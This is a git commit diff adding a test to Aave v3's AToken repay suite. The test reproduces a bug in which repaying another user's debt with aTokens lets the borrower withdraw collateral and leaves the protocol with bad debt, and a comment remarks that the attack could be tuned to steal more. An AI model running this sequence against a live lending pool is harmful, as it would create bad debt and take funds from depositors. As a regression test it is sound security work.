e06d8413e0b8b771b8e3b59d82b660059a93af5e
Lasse Herskind <16536249+LHerskind@users.noreply.github.com>
2021-11-19 14:38:25 +0000

    test: Add test exploiting the bug

--- test-suites/atoken-repay.spec.ts
+++ test-suites/atoken-repay.spec.ts
@@ -1,12 +1,16 @@
-import { waitForTx, advanceTimeAndBlock } from '@aave/deploy-v3';
+import { waitForTx, advanceTimeAndBlock, evmSnapshot, evmRevert } from '@aave/deploy-v3';
+import { parseUnits } from '@ethersproject/units';
 import { expect } from 'chai';
-import { utils } from 'ethers';
+import { BigNumber, utils } from 'ethers';
 import { MAX_UINT_AMOUNT } from '../helpers/constants';
 import { setBlocktime, timeLatest } from '../helpers/misc-utils';
+import { RateMode } from '../helpers/types';
 import { TestEnv, makeSuite } from './helpers/make-suite';
 
 makeSuite('AToken: Repay', (testEnv: TestEnv) => {
+  let snapFresh: string;
   before('User 0 deposits 100 DAI, user 1 deposits 1 WETH, borrows 50 DAI', async () => {
+    snapFresh = await evmSnapshot();
     const {
       weth,
       pool,
@@ -104,5 +108,81 @@ makeSuite('AToken: Repay', (testEnv: TestEnv) => {
 
     expect(balanceAfter).to.be.closeTo(balanceBefore.sub(debtBefore), 2);
     expect(debtAfter).to.be.equal(0);
+  });
+
+  it('Repaying with ATokens to create bad debt for the protocol (revert expect)', async () => {
+    await evmRevert(snapFresh);
+    const {
+      pool,
+      usdc,
+      weth,
+      dai,
+      users: [alice, bob, depositor],
+    } = testEnv;
+
+    // This is not the optimal attack, can be done better if you want to steal as much as possible.
+
+    const bobSupplyDai = parseUnits('1000', 18);
+    const bobBorrowUSDC = parseUnits('700', 6);
+    expect(await dai.connect(bob.signer)['mint(uint256)'](bobSupplyDai));
+
+    const aliceSupplyWeth = parseUnits('10', 18);
+    const aliceBorrowDai = parseUnits('999', 18);
+    expect(await weth.connect(alice.signer)['mint(uint256)'](aliceSupplyWeth));
+
+    const wethValueBefore = await weth.balanceOf(alice.address);
+    const usdValueBefore = (await dai.balanceOf(bob.address)).add(
+      (await usdc.balanceOf(bob.address))
+        .mul(BigNumber.from(10).pow(12))
+        .add(await dai.balanceOf(alice.address))
+    );
+
+    // Fund pool with usdc
+    expect(await usdc.connect(depositor.signer)['mint(uint256)'](parseUnits('1000', 6)));
+    expect(await usdc.connect(depositor.signer).approve(pool.address, MAX_UINT_AMOUNT));
+    expect(
+      await pool
+        .connect(depositor.signer)
+        .supply(usdc.address, parseUnits('1000', 6), depositor.address, 0)
+    );
+
+    // Bob supply dai and borrow usdc
+    expect(await dai.connect(bob.signer).approve(pool.address, MAX_UINT_AMOUNT));
+    expect(await pool.connect(bob.signer).supply(dai.address, bobSupplyDai, bob.address, 0));
+    expect(
+      await pool
+        .connect(bob.signer)
+        .borrow(usdc.address, bobBorrowUSDC, RateMode.Variable, 0, bob.address)
+    );
+
+    // Alice supply eth and borrow dai
+    expect(await weth.connect(alice.signer).approve(pool.address, MAX_UINT_AMOUNT));
+    expect(
+      await pool.connect(alice.signer).supply(weth.address, aliceSupplyWeth, alice.address, 0)
+    );
+    expect(
+      await pool
+        .connect(alice.signer)
+        .borrow(dai.address, aliceBorrowDai, RateMode.Variable, 0, alice.address)
+    );
+    console.log(`Here`);
+
+    // Bob repay
+    expect(
+      await pool
+        .connect(bob.signer)
+        .repayWithATokens(dai.address, bobSupplyDai, RateMode.Variable, alice.address)
+    );
+    expect(await pool.connect(alice.signer).withdraw(weth.address, MAX_UINT_AMOUNT, alice.address));
+
+    const wethValueAfter = await weth.balanceOf(alice.address);
+    const usdValueAfter = (await dai.balanceOf(bob.address)).add(
+      (await usdc.balanceOf(bob.address))
+        .mul(BigNumber.from(10).pow(12))
+        .add(await dai.balanceOf(alice.address))
+    );
+
+    expect(wethValueAfter).to.be.lte(wethValueBefore);
+    expect(usdValueAfter).to.be.lte(usdValueBefore);
   });
 });
